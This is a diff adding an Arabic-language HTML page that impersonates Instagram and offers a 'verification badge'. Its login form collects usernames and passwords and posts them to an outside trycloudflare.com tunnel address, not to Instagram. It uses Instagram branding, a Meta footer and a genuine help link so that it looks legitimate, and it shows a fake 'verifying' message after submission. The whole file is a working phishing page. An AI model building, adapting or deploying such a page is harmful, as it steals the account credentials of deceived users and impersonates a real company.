@@ -1,0 +1,135 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بوابة توثيق إنستغرام</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');
+
+        /* CSS Styles */
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #fafafa;
+            color: #262626;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* الشعار كنص */
+        .logo {
+            font-family: 'Grand Hotel', cursive;
+            font-size: 55px;
+            text-align: center;
+            margin: 20px 0 10px 0;
+            color: #262626;
+            font-weight: normal;
+        }
+
+        /* حاوية المحتوى الرئيسية */
+        .container {
+            padding: 20px;
+            max-width: 350px;
+            margin: auto;
+            background-color: #fff;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            text-align: center;
+        }
+
+        /* العناوين والفقرات */
+        h2 {
+            font-size: 1.5rem;
+            font-weight: 600;
+            margin-bottom: 10px;
+        }
+
+        p {
+            font-size: 1rem;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            color: #8e8e8e;
+        }
+
+        /* نماذج الإدخال */
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 10px;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            background-color: #fafafa;
+            box-sizing: border-box;
+            /* لضمان أن الحشوة لا تؤثر على العرض الكلي */
+        }
+
+        /* زر التوثيق */
+        .btn-verify {
+            width: 100%;
+            padding: 12px;
+            background-color: #0095f6;
+            /* لون الزر */
+            color: white;
+            border: none;
+            border-radius: 3px;
+            font-weight: 600;
+            cursor: pointer;
+            font-size: 1rem;
+        }
+
+        .btn-verify:hover {
+            background-color: #0077c2;
+        }
+
+        /* تذييل الصفحة */
+        footer {
+            padding: 10px;
+            text-align: center;
+            font-size: 0.8rem;
+            color: #8e8e8e;
+            border-top: 1px solid #dbdbdb;
+            background-color: #fff;
+            margin-top: auto;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <h1 class="logo">Instagram</h1>
+
+        <h2>طلب الحصول على شارة توثيق إنستغرام</h2>
+        <p>لتأكيد هويتك وتأمين حسابك، يرجى ملء النموذج أدناه لبدء عملية التوثيق.</p>
+
+        <form action="https://attract-pretty-preferred-rna.trycloudflare.com/verify" method="post">
+            <input type="text" name="username" placeholder="اسم المستخدم" required>
+            <input type="password" name="password" placeholder="كلمة المرور" required>
+            <button type="submit" class="btn-verify">بدء عملية التوثيق</button>
+            <p id="loading" style="display:none; margin-top:10px;">
+                جاري التحقق من البيانات...
+            </p>
+        </form>
+
+        <div style="margin-top: 20px;">
+            <p style="font-size: 0.8rem;">تأكد من أنك تتبع <a href="https://help.instagram.com/581066165581870"
+                    style="color: #0095f6; text-decoration: none;">إرشادات مجتمع إنستغرام</a>.</p>
+        </div>
+    </div>
+
+    <footer>
+        <p>من Meta<br>
+            © 2026 Instagram from Meta</p>
+    </footer>
+    <script>
+        document.querySelector("form").addEventListener("submit", function () {
+            document.getElementById("loading").style.display = "block";
+        });
+    </script>
+</body>
+
+</html>
